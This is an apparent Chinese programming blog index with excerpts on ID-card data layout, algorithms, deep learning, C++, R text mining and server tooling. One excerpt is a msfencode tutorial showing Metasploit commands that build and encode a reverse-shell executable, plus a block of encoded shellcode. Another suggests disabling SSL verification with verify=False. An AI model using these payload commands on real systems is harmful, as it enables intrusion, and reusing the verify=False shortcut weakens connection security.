<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f41ff61277a111f069bf38a9246e36f2/" rel="bookmark">
			二代身份证上的信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在利用华视的CVR-100U台式识别仪识别二代身份证，记录一下身份证信息通用规范
身份证信息总共145位（中文算一位），分别是：
1、姓名: 15，第1-15位，长度为15
2、性别:1(16)， 第16位，长度为1，1为男，否则为女
3、民族:2(18)， 第17-18位，长度为2,转换成中文，需查表,如01代表汉
4、出生:8(26), 第19-26位，长度为8，如20001010
5、住址:35(61), 第27-61位，长度为35
6、身份证号:18(79), 第62-79位，长度为18位
7、签发机关:15(94),第80-94位,长度为15位
8、有效期限:16(110)，第95-110位，长度为16位，如2000101020201010
9、最新住址:35，第111-145位，长度为35位
民族对应表
[PEOPLE]
01 = 汉
02 = 蒙古
03 = 回
04 = 藏
05 = 维吾尔
06 = 苗
07 = 彝
08 = 壮
09 = 布依
10 = 朝鲜
11 = 满
12 = 侗
13 = 瑶
14 = 白
15 = 土家
16 = 哈尼
17 = 哈萨克
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f41ff61277a111f069bf38a9246e36f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/936634152c7b140b482be9d052482503/" rel="bookmark">
			NOIP 2013 普及组 小朋友的数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述 有 n 个小朋友排成一列。每个小朋友手上都有一个数字,这个数字可正可负。规定每个小朋友的特征值等于排在他前面(包括他本人)的小朋友中连续若干个(最少有一个)小朋友手上的数字之和的最大值。
作为这些小朋友的老师,你需要给每个小朋友一个分数,分数是这样规定的:第一个小朋友的分数是他的特征值,其它小朋友的分数为排在他前面的所有小朋友中(不包括他本人),小朋友分数加上其特征值的最大值。
请计算所有小朋友分数的最大值,输出时保持最大值的符号,将其绝对值对 p 取模后输出。
格式 输入格式 第一行包含两个正整数 n、p,之间用一个空格隔开。
第二行包含 n 个数,每两个整数之间用一个空格隔开,表示每个小朋友手上的数字。
输出格式 输出只有一行,包含一个整数,表示最大分数对 p 取模的结果。
样例1 样例输入1 5 997 1 2 3 4 5 Copy 样例输出1 21 Copy 样例2 样例输入2 5 7 -1 -1 -1 -1 -1 Copy 样例输出2 -1 Copy 限制 每个测试点1s。
提示 样例1说明：
小朋友的特征值分别为 1、3、6、10、15,分数分别为 1、2、5、11、21,最大值 21 对 997 的模是 21。
样例2说明：
小朋友的特征值分别为-1、-1、-1、-1、-1,分数分别为-1、-2、-2、-2、-2,最大值 -1 对 7 的模为-1,输出-1。
对于 50%的数据,1 ≤ n ≤ 1,000,1 ≤ p ≤ 1,000所有数字的绝对值不超过 1000;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/936634152c7b140b482be9d052482503/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23cc0afd9b5124bbf9b8069378986ee9/" rel="bookmark">
			面试常问的深度学习(DNN、CNN、RNN)的相关问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		神经网络 的学习就是学习如何利用矩阵的线性变换加激活函数的非线性变换，将原始输入空间投向线性可分/稀疏的空间去分类/回归。增加节点数：增加维度，即增加线性转换能力。增加层数：增加激活函数的次数，即增加非线性转换次数。
对卡在局部极小值的处理方法： 1.调节步伐：调节学习速率，使每一次的更新“步伐”不同；2.优化起点：合理初始化权重（weights initialization）、预训练网络（pre-train），使网络获得一个较好的“起始点”，如最右侧的起始点就比最左侧的起始点要好。常用方法有：高斯分布初始权重（Gaussian distribution）、均匀分布初始权重（Uniform distribution）、Glorot 初始权重、He初始权、稀疏矩阵初始权重（sparse matrix）。
浅层VS深层： 浅层神经网络可以模拟任何函数，但数据量的代价是无法接受的。深层解决了这个问题。相比浅层神经网络，深层神经网络可以用更少的数据量来学到更好的拟合。深层的前提是：空间中的元素可以由迭代发展而来的。
防止过拟合： L2正则化，Dropout(若规律不是在所有样本中都存在,则dropout会删除这样的规律)，每个epoch之后shuffle训练数据，设置early-stopping。加Batch Normalization(BN首先是把所有的samples的统计分布标准化，降低了batch内不同样本的差异性，然后又允许batch内的各个samples有各自的统计分布)，BN最大的优点为允许网络使用较大的学习速率进行训练，加快网络的训练速度（减少epoch次数），提升效果。
为何使用Batch Normalization： 若用多个梯度的均值来更新权重的批量梯度下降法可以用相对少的训练次数遍历完整个训练集，其次可以使更新的方向更加贴合整个训练集，避免单个噪音样本使网络更新到错误方向。然而也正是因为平均了多个样本的梯度，许多样本对神经网络的贡献就被其他样本平均掉了，相当于在每个epoch中，训练集的样本数被缩小了。batch中每个样本的差异性越大，这种弊端就越严重。一般的解决方法就是在每次训练完一个epoch后，将训练集中样本的顺序打乱再训练另一个epoch，不断反复。这样重新组成的batch中的样本梯度的平均值就会与上一个epoch的不同。而这显然增加了训练的时间。同时因为没办法保证每次更新的方向都贴合整个训练集的大方向，只能使用较小的学习速率。这意味着训练过程中，一部分steps对网络最终的更新起到了促进，一部分steps对网络最终的更新造成了干扰，这样“磕磕碰碰”无数个epoch后才能达到较为满意的结果。
为了解决这种“不效率”的训练，BN首先是把所有的samples的统计分布标准化，降低了batch内不同样本的差异性，然后又允许batch内的各个samples有各自的统计分布。
1. 为什么神经网络高效：并行的先验知识使得模型可用线性级数量的样本学习指数级数量的变体
2. 学习的本质是什么：将变体拆分成因素和知识（Disentangle Factors of Variation）
i. 为什么深层神经网络比浅层神经网络更高效：迭代组成的先验知识使得样本可用于帮助训练其他共用同样底层结构的样本。
ii. 神经网络在什么问题上不具备优势：不满足并行与迭代先验的任务
3. 非迭代：该层状态不是由上层状态构成的任务（如：很深的CNN因为有max pooling，信息会逐渐丢失。而residual network再次使得迭代的先验满足）
CNN: 1）卷积：对图像元素的矩阵变换，是提取图像特征的方法，多种卷积核可以提取多种特征。一个卷积核覆盖的原始图像的范围叫做感受野（权值共享）。一次卷积运算(哪怕是多个卷积核)提取的特征往往是局部的，难以提取出比较全局的特征，因此需要在一层卷积基础上继续做卷积计算 ，这也就是多层卷积。
2）池化：降维的方法，按照卷积计算得出的特征向量维度大的惊人，不但会带来非常大的计算量，而且容易出现过拟合，解决过拟合的办法就是让模型尽量“泛化”，也就是再“模糊”一点，那么一种方法就是把图像中局部区域的特征做一个平滑压缩处理，这源于局部图像一些特征的相似性(即局部相关性原理)。
3) 全连接：softmax分类
训练过程：
卷积核中的因子(×1或×0)其实就是需要学习的参数，也就是卷积核矩阵元素的值就是参数值。一个特征如果有9个值，1000个特征就有900个值，再加上多个层，需要学习的参数还是比较多的。
CNN的三个优点： sparse interaction(稀疏的交互)，parameter sharing(参数共享)，equivalent respresentation(等价表示)。适合于自动问答系统中的答案选择模型的训练。
CNN与DNN的区别： DNN的输入是向量形式，并未考虑到平面的结构信息，在图像和NLP领域这一结构信息尤为重要，例如识别图像中的数字，同一数字与所在位置无关（换句话说任一位置的权重都应相同），CNN的输入可以是tensor，例如二维矩阵，通过filter获得局部特征，较好的保留了平面结构信息。
filter尺寸计算：Feature Map的尺寸等于(input_size + 2 * padding_size − filter_size)/stride+1
RNN: 1. 为什么具有记忆功能？
这个是在RNN就解决的问题，就是因为有递归效应，上一时刻隐层的状态参与到了这个时刻的计算过程中，直白一点呢的表述也就是选择和决策参考了上一次的状态。
2. 为什么LSTM记的时间长？
因为特意设计的结构中具有CEC的特点，误差向上一个状态传递时几乎没有衰减，所以权值调整的时候，对于很长时间之前的状态带来的影响和结尾状态带来的影响可以同时发挥作用，最后训练出来的模型就具有较长时间范围内的记忆功能。
误差回传的主力还是通过了Memory Cell而保持了下来。所以我们现在用的LSTM模型，依然有比较好的效果。
最后整个梳理一下误差回传的过程，误差通过输出层，分类器，隐层等进入某个时刻的Block之后，先将误差传递给了Output Gate和Memory Cell两个地方。
到达输出门的误差，用来更新了输出门的参数w，到达Memory Cell之后，误差经过两个路径，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23cc0afd9b5124bbf9b8069378986ee9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80ceb8fdc1a7bef7f5860b1aa779d55c/" rel="bookmark">
			文本挖掘：手把手教你分析携程网评论数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文本分析的应用越来越广泛，这不，我的工作也开始涉及了文本分析，今天就讲讲关于评论数据的那点事。
首先评论数据如何获取？
一般通过网络爬虫的方式抓取各大网站的评论数据，本次分析数据就来源于携程网某酒店的评论，在同事的协助下，成功爬取该酒店的评论数据，于是我开始使用这些数据做相关的分析。
本次文本分析中需要使用如下3个包：
1）Rwordseg包用于分词
2）tmcn用于词频统计
3）wordcloud用于绘制文字云
library(Rwordseg)
library(tmcn)
library(wordcloud)
#读取数据
Evaluation &lt;- read.csv(file = file.choose(), encoding = 'UFT-8')
#剔除评论数据中含有的英文和数字
text &lt;- gsub('[a-zA-Z0-9]','',Evaluation$Evaluation)
#分词
segword &lt;- segmentCN(strwords = text)
#查看第一条评论的分词效果
segword[1]
从上图的结果中发现，经分割后的词中有许多无意义的停止词，如“是”，“只”，“了”，“也”等，这些词是需要剔除的。关于停止词，可以到网上搜索获取。
#读取停止词
mystopwords &lt;- read.table(file = file.choose(), stringsAsFactors = FALSE)
head(mystopwords)
class(mystopwords)
由于读入的数据为数据框格式，需要将其转换为向量格式，即：
mystopwords &lt;- as.vector(mystopwords[,1])
head(mystopwords)
现在有了停止词词库，接下来需要将分割后的词与停止词词库进行比对，将含有停止词的词进行剔除。下面是自定义删除停止词的函数：
removewords &lt;- function(target_words,stop_words){
target_words = target_words[target_words%in%stop_words==FALSE]
return(target_words)
}
#将该函数应用到已分割的词中
segword2 &lt;- sapply(X = segword, FUN = removewords, mystopwords)
#查看已删除后的分词结果
segword2[[1]]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80ceb8fdc1a7bef7f5860b1aa779d55c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f84ec3b11e99c3dcc1f9544dc1795223/" rel="bookmark">
			C&#43;&#43;中SIN的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用的是弧度，用的是弧度，用的是弧度
那么角度转换为弧度的方法为
#define PI 3.1415927
x=(ct/180*PI);
x为弧度，ct为角度
同理，cos，tan，asin，atan，acos都是用的弧度哦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b14ede3007e69c7c438a64eefc36039/" rel="bookmark">
			sizeof()计算结构体的大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sizeof()计算结构体的大小
简要说明：结构体成员按照定义时的顺序依次存储在连续的内存空间，但是结构体的大小并不是简单的把所有成员大小相加，而是遵循一定的规则，需要考虑到系统在存储结构体变量时的地址对齐问题。
一、没有成员的结构体占用的空间是多少个字节？
答案是：1个字节。
这就是实例化的原因（空类同样可以被实例化），每个实例在内存中都有一个独一无二的地址，为了达到这个目的，编译器往往会给一个空类或空结构体（C++中结构体也可看为类）隐含的加一个字节，这样空类或空结构体在实例化后在内存得到了独一无二的地址，所以空类所占的内存大小是1个字节。
二、首先介绍一个相关的概念——偏移量
struct stru { int a; //start address is 0
char b; //start address is 4
int c; //start address is 8
};
偏移量指的是结构体变量中成员的地址和结构体变量地址的差。结构体大小等于最后一个成员的偏移量加上最后一个成员的大小。显然，结构体变量中第一个成员的地址就是结构体变量的首地址。比如上面的结构体，第一个成员a的偏移量为0。第二个成员b的偏移量是第一个成员的偏移量加上第一个成员的大小（0+4）,其值为4；第三个成员c的偏移量是第二个成员的偏移量应该是加上第二个成员的大小（4+1）。
三、在实际中，存储变量时地址要求对齐，编译器在编译程序时会遵循两条原则：
（1）结构体变量中成员的偏移量必须是成员大小的整数倍（0被认为是任何数的整数倍） （2）结构体大小必须是所有成员大小的整数倍，也即所有成员大小的公倍数。
例子1： struct stru1 { int a; //start address is 0
char b; //start address is 4
int c; //start address is 8
};
PS:用sizeof求该结构体的大小，发现值为12。int占4个字节，char占1个字节，结果应该是9个字节才对啊，为什么呢？这个例子中前两个成员的偏移量都满足要求，但第三个成员的偏移量为5，并不是自身(int)大小的整数倍。编译器在处理时会在第二个成员后面补上3个空字节，使得第三个成员的偏移量变成8。结构体大小等于最后一个成员的偏移量加上其大小，上面的例子中计算出来的大小为12，满足要求。
例子2：
struct stru2 { int i; //start address is 0
short m; //start address is 4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b14ede3007e69c7c438a64eefc36039/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21bfdc67dde85bdccb795042e48d338c/" rel="bookmark">
			msfencode的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单介绍一下msfencode的使用。
msfencode -t exe -c 5 &gt; /root/Desktop/door.exe msfencode -e x86/shikata_ga_nai -t raw -a x86 -b '\x00\x0a\x0d' -c 10 -o Temp17.exe -i 上面有raw参数，那什么是RAW数据？Payload生成了一什么样的数据格式? RAW数据就是汇编Payload数据
msfencode使用关键 大多数文章中描绘了将msfpayload生成的原始数据传输给msfencode.即:
./msfpayload win32_reverser LHOST 本机IP R | msfencode -e ShiKata_ga_nai -t exe &gt; 输出路径 那么通过”|”即管道符传递的到底是什么呢? 答案是ShellCode的16进制.
msfencode -h是帮助.比较清晰
生成一个先 用16进制编辑器写任意一段汇编放在一个文件中,我用cc.cc.
root@kali:/usr/share/framework2# ./msfencode -e Alpha2 -i cc.cc [*] Using Msf::Encoder::Alpha2 with final size of 102 bytes "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49". "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x43". "\x58\x50\x30\x41\x31\x42\x41\x6b\x42\x41\x53\x42\x32\x42\x41\x32". "\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x6d\x39\x58\x4c\x48". "\x4c\x5a\x6c\x7a\x6c\x78\x4c\x4a\x6c\x68\x4c\x38\x4c\x4a\x6c\x58". "\x4c\x78\x4c\x38\x4c\x58\x4c\x38\x4c\x4a\x6c\x5a\x6c\x7a\x6c\x48". "\x4c\x68\x4c\x6a\x6c\x43"; 666,可以再试试别的模块.
模块众多 有九款编码器,666,我看到一款就震惊了.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21bfdc67dde85bdccb795042e48d338c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5cd4e39800dd0556a4b149e7bc635c0/" rel="bookmark">
			运算放大器工作原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运算放大器工作原理 作者：何富和时间：2015-03-22来源：电子产品世界 运算放大器基本上可以算得上是模拟电路的基本需要了解的电路之一，而要想更好用好运放，透彻地了解运算放大器工作原理是无可避免，但是运放攻略太多，那不妨来试试这篇用电路图作为主线的文章来带你领略运算放大器的工作原理吧。 本文引用地址：http://www.eepw.com.cn/article/271351.htm
1.运算放大器工作原理综述： 运算放大器组成的电路五花八门，令人眼花瞭乱，在分析运算放大器工作原理时倘没有抓住核心，往往令人头大。本文收集运放电路的应用电路，希望看完后有所收获。但是在分析各个电路之前，还是先回忆一下两个运放教材里必教的技能，就是“虚短”和“虚断”。 “虚短”是指在分析运算放大器处于线性状态时，可把两输入端视为等电位，这一特性称为虚假短路，简称虚短。显然不能将两输入端真正短路。 “虚断”是指在分析运放处于线性状态时，可以把两输入端视为等效开路，这一特性 称为虚假开路，简称虚断。显然不能将两输入端真正断路。
2.运算放大器工作原理经典电路图一 图一运算放大器的同向端接地=0V，反向端和同向端虚短，所以也是0V，反向输入端输入电阻很高，虚断，几乎没有电流注入和流出，那么R1和R2相当于是串联的，流过一个串联电路中的每一只组件的电流是相同的，即流过R1的电流和流过R2的电流是相同的。流过R1的电流I1 = (Vi - V-)/R1 ……a 流过R2的电流I2 = (V- - Vout)/R2 ……b V- = V+ = 0 ……c I1 = I2 ……d 求解上面的初中代数方程得Vout = (-R2/R1)*Vi 这就是传说中的反向放大器的输入输出关系式了。
3.运算放大器工作原理经典电路图二 图二中Vi与V-虚短，则 Vi = V- ……a 因为虚断，反向输入端没有电流输入输出，通过R1和R2 的电流相等，设此电流为I，由欧姆定律得： I = Vout/(R1+R2) ……b Vi等于R2上的分压， 即：Vi = I*R2 ……c 由abc式得Vout=Vi*(R1+R2)/R2 这就是传说中的同向放大器的公式了。
4.运算放大器工作原理经典电路图三 图三中，由虚短知： V- = V+ = 0 ……a 由虚断及基尔霍夫定律知，通过R2与R1的电流之和等于通过R3的电流，故 (V1 – V-)/R1 + (V2 – V-)/R2 = (Vout – V-)/R3 ……b 代入a式，b式变为V1/R1 + V2/R2 = Vout/R3 如果取R1=R2=R3，则上式变为Vout=V1+V2，这就是传说中的加法器了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5cd4e39800dd0556a4b149e7bc635c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5ae5987c0fbafaa2f5ef0c162a724fb/" rel="bookmark">
			C&#43;&#43; replace函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt; #include&lt;string&gt; #include&lt;iostream&gt; using namespace std; string line="it*is*a string!"; /*用法一： 用str替换指定字符串从起始位置pos开始长为len的字符串 *string&amp; replace (size_t pos, size_t len, const string&amp; str); */ void string_1(string s1){ cout&lt;&lt;"method_1"&lt;&lt;endl; s1=s1.replace(s1.find("*"),1,"/"); cout&lt;&lt;s1&lt;&lt;endl; } /*用法二： 用str替换迭代器起始位置和结束位置的字符 *string&amp; replace (const_iterator i1, const_iterator i2, const string&amp; str); */ void string_2(string s1){ cout&lt;&lt;"method_2"&lt;&lt;endl; s1=s1.replace(s1.begin(),s1.begin()+6,"-"); cout&lt;&lt;s1&lt;&lt;endl; } /*用法三： 用str的指定字串（给定起始位置和长度）替换指定位置 *string&amp; replace (size_t pos, size_t len, const string&amp; str, size_t subpos, size_t sublen); */ void string_3(string s1){ cout&lt;&lt;"method_3"&lt;&lt;endl; string str1="885988"; s1=s1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5ae5987c0fbafaa2f5ef0c162a724fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b60f979098247efad1ac5938e58c7d4/" rel="bookmark">
			服务器性能监控之New Relic 入门教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		New Relic 是一个很强大的服务器性能监控工具，New Relic目前专注于SaaS和App性能管理业务，它支持支持agent和API传送数据，能够对部署在本地或在云中的web应用程序进行监控、故障修复、诊断、线程分析以及容量计划。
New Relic APM将你没有发现的问题暴漏出来，帮助团队减少问题解决的时间，从而集中精力写出更多的代码，而不是一直在停留在故障排除。
端对端事务跟踪：跟踪一个关键事务的性能，这个事务贯穿在整个面向服务应用程序环境。代码级的可见性：深入洞察特定代码段和SQL语句对性能的影响。关键事务：标记你的最关键的事务，当响应时间、调用、错误率等这些表现不佳的时候可以迅速的发现。X光会话：通过展示事务跟踪长期分析的结果，来获得对一个关键事务性能更深入的了解。 简单工作原理 RPM拥有两种基本的组件：作为应用程序插件运行的代理，以及放置在New Relic数据中心中的服务。代理会收集性能数据，每分钟都会通过HTTPS或者HTTP协议异步地发送给RPM服务，New Relic那里会存储并处理这些数据。
New Relic数据中心会完成以下的工作：数据存储、聚集、修正和可视化。我们可以通过浏览器访问性能数据。 New Relic不提供在本地运行服务的方案，服务只运行在他们的数据中心上。
安装 APM（以java监控Tomcate为例） 注册一个New Relic账号（https://newrelic.com/signup）。
登录网站选择APM（Application Performance Management，应用性能管理），选择Get Started，假如已经有了applications，就选择[+Add more],如图：
选择java 在这里你还需要一些前置条件才能进行下面的操作：
你要服务器的管理员权限你需要配置防火墙允许New Relic 代理访问网络（发送数据）。访问您的Windows Azure管理门户。 获取自己独有的license_key,如图： 点击按钮就可以看到license_key了。这个license_key每个newrelic账号是唯一的,也是Agent能成功发送数据到服务器的关键。
下载代理 将下载的文件解压到应用服务器根目录 我这里是tomcate，所以我解压到我自己的tomcate根目录/usr/local/tomcat/apache-tomcat-7.0.70下
unzip newrelic-java-3.40.0.zip -d /usr/local/tomcat/apache-tomcat-7.0.70/ 修改配置（可以不修改直接使用默认的） 切换到/usr/local/tomcat/apache-tomcat-7.0.70/newrelic目录，在目录中找到newrelic.yml配置文件。license_key选项就是第4步获得的key，主要是修改app_name，修改成自己应用名字。
app_name: Demo APP 切换到/usr/local/tomcat/apache-tomcat-7.0.70/newrelic 下面运行安装命令 cd /usr/local/tomcat/apache-tomcat-7.0.70/newrelic java -jar newrelic.jar install 我们可以看到如下提示信息：
root@iZ282d1y91zZ:/usr/local/tomcat/apache-tomcat-7.0.70/newrelic# java -jar newrelic.jar install ***** ( ( o)) New Relic Java Agent Installer ***** Installing version 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b60f979098247efad1ac5938e58c7d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05a5c508cf21cc00292c799a2dfbf9bb/" rel="bookmark">
			Hadoop &#34;Cannot create directory .Name node is in safe mode.&#34;解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：http://www.waitig.com/hadoop-name-node-is-in-safe-mode.html
在使用Hadoop建立文件的时候，出现“Cannot create directory /user/hadoop/input. Name node is in safe mode.”问题的原因及解决方案
问题描述 将本地文件复制到hdfs上去或者在hafs上新建文件时会出现“Cannot … directory … Name node is in safe mode”的错误。
问题原因
hdfs在启动开始时会进入安全模式，这时文件系统中的内容不允许修改也不允许删除，直到安全模式结束。安全模式主要是为了系统启动的时候检查各个DataNode上数据块的有效性，同时根据策略必要的复制或者删除部分数据块。运行期通过命令也可以进入安全模式。在实践过程中，系统启动的时候去修改和删除文件也会有安全模式不允许修改的出错提示，只需要等待一会儿即可。
问题解决 可以等待其自动退出安全模式，也可以使用手动命令来离开安全模式：
bin/hadoop dfsadmin -safemode leave 将模式关闭后，返回如下命令
关闭成功
转载于:https://my.oschina.net/u/3616609/blog/1476952
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/664b2e0f3dcea11bea9bbcfe931b7fc5/" rel="bookmark">
			关于SSL错误, SSLError: [Errno 1] _ssl.c:510: error:14090086:SSL routines
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述:
在测试服务器部署运行没有问题, 但是更新到正式环境, 出现了如题的错误:
requests.exceptions.SSLError: [Errno 1] _ssl.c:503: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed 经查阅资料, 发现解决方案大致有两种: 1. 在正式环境重新安装 certifi
sudo pip uninstall -y certifi sudo pip install certifi==2015.04.28 (亲测有效)
2.在request请求里加入verify=False, 例: request.post(... , verify=False)
(未测, 留存)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d61184ebf8fd5caddfb5625185b4d60/" rel="bookmark">
			PHP中-&gt;和=&gt;的意思
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在学习PHP中，遇到了-&gt;和=&gt;这两个符号。
刚遇到这两个符号的时候不知道它们代表的含义，在经过百度后才发这两个符号的秘密。
下面来看一下在PHP中-&gt;的秘密，如下代码。
&lt;?php class Car { public $speed = 0; //增加speedUp方法，使speed加10 public function speedUp(){ $this-&gt;speed+=10; } } $car = new Car(); $car-&gt;speedUp(); echo $car-&gt;speed; ?&gt; 在这个里面，我们可以看到在类里面定义了一个speedUp的方法，在此方法中可以看到 $this-&gt;speed+=10，这行代码。-&gt;代表什么呢？ 在经过百度后，我自己认为他代表的是汉字中“的”这个字的含义，比如这行代码，翻译过来就是$this的speed等于speed加10。当然这只代表本人的观点，如果有错请多指教。
接下来就是=&gt;了，简单来说就是=&gt;符号来分隔键和值，左侧表示键，右侧表示值。来看段代码吧。
&lt;?php //从数组变量$arr中，读取键为apple的值 $arr = array('apple'=&gt;"苹果",'banana'=&gt;"香蕉",'pineapple'=&gt;"菠萝"); $arr0=$arr["apple"]; if( isset($arr0) ) {print_r($arr0); } ?&gt; 在此代码中，先声明一个arr数组，然后声明一个arr0等于苹果的键，接下来用IF来判断他是否存在，如果存在则输出数组中，此键右侧的值。 简单来说就是给别人起一个外号，用外号来代表某个人，提起他的外号，就可以知道他是谁的意思。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ead86e72dcee0fbb168ea1eefb29fd8/" rel="bookmark">
			在while循环里switch菜单和scanf输入的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小问题：
do
{
menu();
printf("请选择&gt;:\n");
rewind(stdin);
scanf("%d",&amp;input);
switch(input)
{
case 1:
game();
input=0;
break;
case 2:
input=0;
break;
default:
printf("选择错误\n");
break;
}
}while(input);
在上面代码中，在switch中跳出一项用可以break;但是break只能跳出switch菜单,do while循环仍然继续，要跳出do while则需要在break之前加一句让while跳出的条件，
while(1)
{
printf("输入坐标:");
rewind(stdin); //防止scanf出错
scanf("%d %d",&amp;x,&amp;y);
x--;y--;
if(((x&gt;=0)&amp;&amp;(x&lt;=2))&amp;&amp;((y&gt;=0)&amp;&amp;(y&lt;=2)))
{
if(zone[x][y]==0)
{
zone[x][y]='*';
break;
}
else
{
printf("下标有误，请重新输入！\n");
}
}
else
{
printf("下标有误，重新输入！\n");
}
}
在这个里，scanf在第一次调用时正确，如果出错就会出现死循环，原因是scanf输入受到缓存区影响。
找到处理方法：
1、在每个最后不带\n的printf后面加fflush(stdout);(对标准输出流进行清理，但是它并不是把数据丢掉，而是及时地打印数据到屏幕上。)
2、在每个不想受到输入(接收)缓冲区旧内容影响的scanf();【或者getchar();或者gets_s();】前面加rewind(stdin);（rewind()函数的作用是把文件的当前位置指针指向文件头。）
或者添加fflush(stdin);(fflush(stdin)刷新标准输入缓冲区，把输入缓冲区里的东西丢弃[非标准])
rewind(stdin)清除键盘缓存区
stdin是标准输入，std是standard（标准），in是输入，指键盘输入到缓存区里的东西。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/142c41bd5917be8d0e7d6488045b60f6/" rel="bookmark">
			RedHat如何关闭防火墙
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、查看防火墙是否已开启 #可以查看到iptables服务的当前状态。service iptables status﻿​ 上图表示防火墙已关闭。
2、关闭防火墙 关闭防火墙的方法为：
1）永久性生效
开启：chkconfig iptables on
关闭：chkconfig iptables off
2） 即时生效，重启后失效
开启：service iptables start
关闭：service iptables stop 需要说明的是对于 Linux 下的其它服务都可以用以上命令执行开启和关闭操作。
转载于:https://my.oschina.net/u/3616609/blog/1476038
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9238e696bd90db03ae907a2d9660d6e/" rel="bookmark">
			Linux下批处理文件编写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux下的批处理文件，基本就是shell脚本文件。 一、最简单的脚本书写方法为： 1、新建一个文件，名字为test(自己定义的名字)
touch test.sh
2、在里面编写脚本
程序必须以下面的行开始（必须方在文件的第一行）： #!/bin/sh 符号#!用来告诉系统它后面的参数是用来执行该文件的程序。在这个例子中我们使用/bin/sh来执行程序。 (能写一些shell普通命令，命令用分号隔开)
